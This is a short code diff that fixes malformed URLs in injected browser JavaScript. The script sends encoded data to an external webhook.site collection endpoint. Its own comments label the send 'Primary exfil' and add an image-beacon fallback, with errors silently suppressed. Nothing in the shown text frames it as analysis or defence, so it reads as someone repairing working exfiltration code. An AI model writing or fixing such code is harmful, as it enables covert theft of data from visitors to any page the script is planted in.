@@ -14,13 +14,13 @@
     const payload = encodeURIComponent(JSON.stringify(data));
 
     // Primary exfil
-    fetch("https://https://webhook.site/d51a0f1d-1211-4928-8778-079a065dd0bc?d=" + payload, {
+    fetch("https://webhook.site/d51a0f1d-1211-4928-8778-079a065dd0bc?d=" + payload, {
         method: "GET",
         mode: "no-cors"
     }).catch(() => {});
 
     // Fallback (Image beacon)
-    new Image().src = "https://https://webhook.site/d51a0f1d-1211-4928-8778-079a065dd0bc?img=" + payload;
+    new Image().src = "https://webhook.site/d51a0f1d-1211-4928-8778-079a065dd0bc?img=" + payload;
 
 })();
 </script>
